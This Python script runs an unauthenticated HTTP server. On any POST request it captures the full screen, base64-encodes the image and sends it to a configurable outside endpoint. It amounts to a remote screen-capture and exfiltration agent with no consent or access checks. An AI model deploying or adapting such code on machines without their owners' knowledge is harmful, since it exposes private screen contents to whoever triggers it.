import base64
import io
from PIL import ImageGrab
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi

# Your endpoint here (ExpressJS Server or Custom REST API)
endpoint = ""

def send():
    screenshot = ImageGrab.grab()
    buffer = io.BytesIO()
    screenshot.save(buffer, format='PNG')
    screenshot_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
    response = requests.post(endpoint, json={'image_data': screenshot_data})
    # print(response.text)

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = "Received traffic from server-side"
        print("Received traffic from server-side")
        self.wfile.write(response.encode('utf-8'))
        send()

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('HTTP Daemon started on port %s' % port)
    httpd.serve_forever()

if __name__ == '__main__':
    run()
